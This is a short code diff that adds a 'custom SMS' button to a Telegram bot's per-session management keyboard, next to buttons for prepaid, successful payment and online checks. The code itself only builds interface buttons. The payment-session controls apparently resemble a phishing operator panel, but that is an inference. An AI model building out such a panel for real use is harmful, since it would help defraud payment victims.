@@ -34,6 +34,7 @@ def get_management_keyboard(session_id: str):
             InlineKeyboardButton(text="❌ Prepaid", callback_data=f"prepaid:{session_id}")
         ],
         [
+            InlineKeyboardButton(text="📱 Кастом SMS", callback_data=f"custom_sms:{session_id}"),
             InlineKeyboardButton(text="✅ Успешная оплата", callback_data=f"success:{session_id}"),
             InlineKeyboardButton(text="🔍 Проверить онлайн", callback_data=f"check_online:{session_id}")
         ]
